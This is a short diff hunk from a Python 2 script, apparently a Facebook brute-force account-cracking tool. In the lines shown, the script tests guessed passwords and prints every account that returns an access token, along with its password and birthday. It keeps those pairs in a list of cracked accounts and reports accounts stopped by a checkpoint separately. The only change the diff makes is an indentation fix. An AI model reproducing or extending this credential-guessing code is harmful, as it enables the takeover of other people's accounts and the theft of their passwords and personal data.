@@ -402,7 +402,7 @@ def pilih_mbf():
                                 if 'access_token' in q:
                                    print '\x1b[1;91mARBAB-OK ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass6 
                                    print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
-                                    oks.append(user + pass6)
+                                   oks.append(user + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
                                     print '\x1b[1;92mCHECKPOINT ' + user + '\xe2\x80\xa2\xe2\x80\xa2' + pass6 
                                     print '\xe2\x80\xa2\xe2\x80\xa2TTL ' + b['birthday']
